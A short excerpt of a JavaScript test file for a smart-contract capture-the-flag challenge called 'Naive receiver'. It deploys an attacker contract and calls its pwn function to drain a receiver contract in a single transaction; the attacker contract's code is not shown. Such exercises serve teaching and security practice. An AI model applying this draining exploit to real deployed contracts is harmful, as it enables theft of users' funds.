...
describe('[Challenge] Naive receiver', function () {
    ...
    before(async function () {
        ...
        const NRAttackerFactory = await ethers.getContractFactory('NRAttacker', deployer);
        ...
        this.nrAttacker = await NRAttackerFactory.deploy();
    });
    ...
    it('Exploit', async function () {
        ...
        // 1 txn drain
        this.nrAttacker.connect(attacker).pwn(this.pool.address, this.receiver.address);
    });
